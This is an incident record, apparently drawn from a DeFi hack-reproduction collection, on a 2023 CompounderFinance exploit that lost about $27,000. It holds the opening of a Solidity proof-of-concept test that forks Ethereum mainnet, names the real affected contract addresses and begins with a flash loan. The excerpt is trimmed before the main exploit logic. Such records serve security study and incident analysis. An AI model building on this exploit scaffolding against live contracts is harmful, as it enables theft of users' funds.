# [?] CompounderFinance - Manipulation of funds through fluctuations in the amount of exchangeable assets

## Summary
Severity: Unknown
Chain: Ethereum
Component: CompounderFinance
Published: 2023-06-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CompounderFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$27,174
References:
- https://twitter.com/numencyber/status/1666346419702362112

```solidity
contract ContractTest is Test {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    // Compounder DAI Stablecoin
    IcDAI cDAI = IcDAI(0x2381742592ab54dC2e89f193AF682D914A8b24C1);
    // iearn DAI
    IyDAI yDAI = IyDAI(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    IERC20 yUSDC = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    IERC20 yUSDT = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 yTUSD = IERC20(0x73a052500105205d34Daf004eAb301916DA8190f);
    IERC20 CentreUSDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Uni_Pair_V3 DAIUSDCPool = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    ICurveSwap CurveFiSwap = ICurveSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IStrategyCurve StrategyDAICurve = IStrategyCurve(0xaf274e912243b19B882f02d731dacd7CD13072D0);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_426_064);
        cheats.label(address(DAI), "DAI");
        cheats.label(address(cDAI), "cDAI");
        cheats.label(address(yDAI), "yDAI");
        cheats.label(address(yUSDC), "yUSDC");
        cheats.label(address(yUSDT), "yUSDT");
        cheats.label(address(yTUSD), "yTUSD");
        cheats.label(address(CentreUSDC), "CentreUSDC");
        cheats.label(address(DAIUSDCPool), "DAIUSDCPool");
        cheats.label(address(CurveFiSwap), "CurveFiSwap");
        cheats.label(address(StrategyDAICurve), "StrategyDAICurve");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker amount of DAI before hack", DAI.balanceOf(address(this)), DAI.decimals());

        // Step 1. Flashloan 1_239 DAI through Uniswap V3 flash loans
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CompounderFinance_exp.sol_
